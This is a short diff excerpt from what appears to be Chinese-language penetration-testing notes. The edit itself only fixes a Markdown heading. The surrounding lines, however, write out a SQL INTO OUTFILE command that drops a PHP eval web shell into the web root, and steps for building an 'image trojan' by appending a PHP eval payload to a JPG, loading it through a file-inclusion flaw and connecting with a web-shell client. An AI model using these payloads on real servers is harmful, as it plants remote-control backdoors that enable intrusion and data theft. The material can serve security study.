@@ -516,6 +516,6 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 2. 上传制作好的图片马
 3. 使用文件包含include图片马
 4. 菜刀连接
-###6.1 制作一个图片马
+### 6.1 制作一个图片马
 我们可以准备一个内容为`<?php @eval($_POST['hello']); ?> `的txt文档(name.txt)和一张不要太大的图片(可以是png/jpg/bng什么的，就叫1.jpg好了)
 然后在CMD下使用`copy 1.jpg/b + name.txt/a 2.jpg `命令就可以轻松地得到一个名为2.jpg的图片马
